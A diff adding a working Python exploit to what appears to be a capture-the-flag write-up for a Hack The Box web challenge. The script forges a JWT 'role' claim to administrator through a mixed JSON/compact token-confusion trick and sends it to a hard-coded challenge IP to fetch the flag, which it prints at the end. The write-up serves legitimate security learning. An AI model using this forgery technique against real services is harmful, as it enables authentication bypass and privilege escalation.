@@ -27,3 +27,51 @@ we can just add a fragment # (encoded) `/api/v1/get_ticket#`
 both will work, After getting the JWT, We can that we have a role `guest` let's forge it to `Administrator`
 <br></br>
 <img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/HTB_cyber_apocalypse/WEB/images/6.PNG">
+<br></br>
+Exploit: 
+```py
+from requests import *
+import re
+from json import loads, dumps
+from jwcrypto.common import base64url_decode, base64url_encode
+import argparse
+r=get("http://83.136.254.223:41786//api/v1/get_ticket")
+js=r.json()
+
+ticket_value = js.get('ticket: ', None)
+
+token=ticket_value
+claim="role=administrator"
+
+# Split JWT in its ingredients
+[header, payload, signature] = token.split(".")
+
+
+# Payload is relevant
+parsed_payload = loads(base64url_decode(payload))
+print(f"[+] Decoded payload: {parsed_payload}")
+
+# Processing of the user input and inject new claims
+try:
+    claims = claim.split(",")
+    for c in claims:
+        key, value = c.split("=")
+        parsed_payload[key.strip()] = value.strip()
+except:
+    print("[-] Given claims are not in a valid format")
+    exit(1)
+
+# merging. Generate a new payload
+
+fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
+
+
+# Create a new JWT Web Token
+new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
+print(new_payload)
+
+url="http://83.136.254.223:41786/api/v1/flag"
+r=get(url,headers={"Authorization":new_payload})
+print(r.text)
+#{"message":"HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}"}
+```
